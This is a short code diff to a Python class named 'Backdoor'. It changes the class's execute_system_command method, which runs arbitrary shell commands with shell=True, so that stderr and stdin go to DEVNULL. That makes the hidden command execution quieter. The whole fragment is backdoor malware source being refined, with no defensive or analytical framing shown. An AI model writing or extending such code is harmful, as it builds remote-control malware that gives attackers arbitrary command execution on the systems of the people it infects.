@@ -15,7 +15,7 @@ class Backdoor:
     @staticmethod
     def execute_system_command(command):
         try:
-            return subprocess.check_output(command, shell=True)
+            return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
         except subprocess.CalledProcessError as e:
             return e.output
 
